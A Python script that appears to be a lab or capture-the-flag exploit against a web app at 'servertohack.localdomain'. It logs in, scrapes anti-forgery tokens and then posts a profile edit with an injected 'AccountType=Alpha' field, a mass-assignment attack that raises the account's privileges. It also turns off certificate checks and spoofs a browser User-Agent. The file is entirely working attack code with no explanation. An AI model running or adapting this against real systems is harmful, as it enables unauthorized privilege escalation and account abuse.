#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
import configparser
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import urllib


#
# Variables
#

debugOrNot = False
target_hostname = 'servertohack.localdomain'
target_proto = 'https'
config = configparser.ConfigParser()
config.read('config.ini')
username = config['credentials']['username']
password = config['credentials']['password']
base_url = target_proto + '://' + target_hostname


#
# Debug
#

def myDebug(param):
  if debugOrNot == True:
    print(param)


#
# requestDebug
#

def requestDebug(s, req):
  prepared = req.prepare()
  myDebug('-----------REQUEST-----------')
  myDebug(prepared.method + ' ' + prepared.url)
  myDebug('\n'.join('{}: {}'.format(k, v) for k, v in prepared.headers.items()))
  if prepared.body != None:
    myDebug('\n' + prepared.body)
  r = s.send(prepared)
  r.encoding = 'UTF-8'
  myDebug('\n-----------RESPONSE-----------')
  myDebug('\n'.join('{}: {}'.format(k, v) for k, v in r.headers.items()) + '\n')
  return r


#
# Main
#

s = requests.Session()
s.verify = False

headers = {
  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.104 Safari/537.36',
  'Accept-Encoding': 'none'
}


#
# Get __RequestVerificationToken hidden parameter from FORM
#

req = requests.Request('GET', base_url, headers=headers)
r = requestDebug(s, req)
cookies = requests.utils.dict_from_cookiejar(s.cookies)
token = BeautifulSoup(r.text, 'lxml').find('input', { 'name': '__RequestVerificationToken' }).get('value')
myDebug(token)


#
# Login
#

headers['Content-Type'] = 'application/x-www-form-urlencoded'
payload = 'Login=' + urllib.parse.quote_plus(username) + '&Password=' + urllib.parse.quote_plus(password) + '&__RequestVerificationToken=' + token
req = requests.Request('POST', base_url + '/Login?returnurl=%2F', headers=headers, data=payload, cookies=cookies)
r = requestDebug(s, req)
cookies = requests.utils.dict_from_cookiejar(s.cookies)
del headers['Content-Type']


#
# Browse my profile
#

req = requests.Request('GET', base_url + '/Profile/me', headers=headers, cookies=cookies)
r = requestDebug(s, req)


#
# Edit my profile
#

req = requests.Request('GET', base_url + '/Profile/me/Edit', headers=headers, cookies=cookies)
r = requestDebug(s, req)
displayName = BeautifulSoup(r.text, 'lxml').find('input', { 'name': 'DisplayName' }).get('value')
avatarType = BeautifulSoup(r.text, 'lxml').find('input', { 'name': 'AvatarType' }).get('value')
token = BeautifulSoup(r.text, 'lxml').find('input', { 'name': '__RequestVerificationToken' }).get('value')


#
# Elevate profile to "Alpha"
#

headers['Content-Type'] = 'application/x-www-form-urlencoded'
payload = 'DisplayName=' + urllib.parse.quote_plus(displayName) + '&AvatarType=' + urllib.parse.quote_plus(avatarType) + '&AccountType=Alpha' + '&__RequestVerificationToken=' + token
req = requests.Request('POST', base_url + '/Profile/me/Edit', headers=headers, data=payload, cookies=cookies)
r = requestDebug(s, req)
status = BeautifulSoup(r.text, 'lxml').find_all('b')[1].get_text()
print(status)
del headers['Content-Type']


#
# Logout
#

req = requests.Request('GET', base_url + '/Account/Logout', headers=headers, cookies=cookies)
r = requestDebug(s, req)

